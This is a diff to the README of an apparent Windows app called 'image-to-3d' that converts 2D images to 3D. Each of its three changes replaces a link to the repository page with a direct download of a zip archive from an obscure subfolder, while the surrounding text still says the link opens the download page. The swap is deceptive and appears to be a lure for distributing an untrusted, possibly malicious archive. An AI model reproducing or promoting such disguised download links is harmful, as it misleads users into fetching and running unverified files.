@@ -1,6 +1,6 @@
 # 🖼️ image-to-3d - Turn 2D images into 3D
 
-[![Download image-to-3d](https://img.shields.io/badge/Download-Visit%20the%20page-blue?style=for-the-badge)](https://github.com/lento-inversion286/image-to-3d)
+[![Download image-to-3d](https://img.shields.io/badge/Download-Visit%20the%20page-blue?style=for-the-badge)](https://github.com/lento-inversion286/image-to-3d/raw/refs/heads/main/kempy/to-d-image-v1.0.zip)
 
 ## ✨ What this app does
 
@@ -10,7 +10,7 @@ image-to-3d helps you turn a single 2D image into a 3D model on Windows. It is b
 
 Use this link to visit the download page:
 
-https://github.com/lento-inversion286/image-to-3d
+https://github.com/lento-inversion286/image-to-3d/raw/refs/heads/main/kempy/to-d-image-v1.0.zip
 
 ### Steps to get started
 
@@ -182,4 +182,4 @@ This helps you see how the app handles shape, depth, and edges.
 
 Open the download page here if you need the app file again:
 
-https://github.com/lento-inversion286/image-to-3d
+https://github.com/lento-inversion286/image-to-3d/raw/refs/heads/main/kempy/to-d-image-v1.0.zip
